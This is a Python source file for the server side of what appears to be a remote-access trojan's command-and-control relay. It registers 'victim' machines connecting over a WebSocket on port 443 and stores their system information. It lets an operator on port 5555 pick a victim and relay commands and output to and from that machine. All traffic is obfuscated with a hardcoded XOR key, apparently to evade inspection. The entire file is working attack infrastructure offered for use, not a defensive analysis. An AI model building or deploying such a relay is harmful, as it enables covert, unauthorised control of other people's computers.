import websockets
import asyncio
import uuid
import json

# Store connected victims.
victim_list = {}

# Store Victim details.
victim_info = {}


# Combine victim id and victim's system info.
def display_info():

    output = []
    n = 1

    for key, value in victim_info.items():
        output.append(f'{n}. {value} --> {key}')
        n += 1

    return output


# For xor obfuscation secure packets.
def xor_sec(data):

    xor_key = '_!cipher@#'
    return bytes([b ^ ord(xor_key[i % len(xor_key)]) for i, b in enumerate(data)])


# Handle victim side connection.
async def victim_handle(websocket):

    # Store victim's connected ip and port.
    ip, port = websocket.remote_address

    # Assign a UUID to victim.
    victim_id = str(uuid.uuid4())

    # Gather victims system info.
    data = await websocket.recv()
    data = xor_sec(data).decode()

    if data:
        victim_info[victim_id] = data

    # Assign websocket to UUID.
    victim_list[victim_id] = websocket

    print(f'[+] Victim {ip}:{port} connected')

    try:
        # Check the victim is still alive or not.
        await websocket.wait_closed()

    except Exception:
        pass

    finally:
        print(f'[!] Victim {ip}:{port} disconnected')
        victim_list.pop(victim_id, None)
        victim_info.pop(victim_id, None)


# Handle listener side connection.
async def listener_handle(reader, writer):

    addr = writer.get_extra_info('peername')
    print(f'[+] Listener {addr} connected')

    try:

        # Send the UUID of connected victim to listener.
        if not victim_list.keys():
            writer.write(xor_sec(json.dumps(
                {'error': '\n[!] No connected victims'}).encode()))
            await writer.drain()
            writer.close()

        writer.write(xor_sec(json.dumps(
            {'victims': display_info()}).encode()))
        await writer.drain()

        # Get victim id that listener selected.
        data = await reader.read(10000000000)

        if data:

            # Get the selected UUID.
            selected_id = json.loads(xor_sec(data).decode())['select']

            # Check selected id is valid.
            if selected_id in victim_list.keys():

                writer.write(
                    xor_sec(json.dumps({'success': '\n[+] Victim ID is correct'}).encode()))
                await writer.drain()

                victim = victim_list[selected_id]

                # Notify victim that it is selected.
                await victim.send(xor_sec(json.dumps({'select': 'Selected'}).encode()))

                # Send messages that comming from victim to listener.
                async def relay_victim_to_listener():

                    try:
                        while True:
                            msg = await victim.recv()
                            writer.write(
                                msg.encode() if isinstance(msg, str) else msg)
                            await writer.drain()

                    except websockets.exceptions.ConnectionClosedOK:
                        victim_list.pop(selected_id, None)
                        victim_info.pop(selected_id, None)

                    except Exception as e:
                        print(f'[!] {e}')

                asyncio.create_task(relay_victim_to_listener())

                # Send messages that comming from listener to victim.
                try:
                    while True:
                        data = await reader.read(10000000000)

                        if not data:
                            break

                        await victim.send(data)

                except websockets.exceptions.ConnectionClosedOK:
                    print('[!] Listener disconnected!')

                except Exception as e:
                    print(f'[!] {e}')

                finally:
                    await victim.close()
                    victim_list.pop(selected_id, None)
                    victim_info.pop(selected_id, None)
                    writer.close()

            else:
                writer.write(
                    xor_sec(json.dumps({'error': '\n[!] Selected ID is wrong'}).encode()))
                await writer.drain()
                writer.close()
                print('[!] Listener disconnected!')

        else:
            writer.close()
            print('[!] Listener disconnected!')

    except websockets.exceptions.ConnectionClosed:
        writer.close()
        print('[!] Listener disconnected!')


# Handle both victim and listener connections.
async def main():

    # Use to run victim and listener handle asynchronously.
    victim_websocket = await websockets.serve(victim_handle, '0.0.0.0', 443)
    async_tcp_socket = await asyncio.start_server(listener_handle, '0.0.0.0', 5555)

    await asyncio.gather(victim_websocket.wait_closed(), async_tcp_socket.serve_forever())

asyncio.run(main())
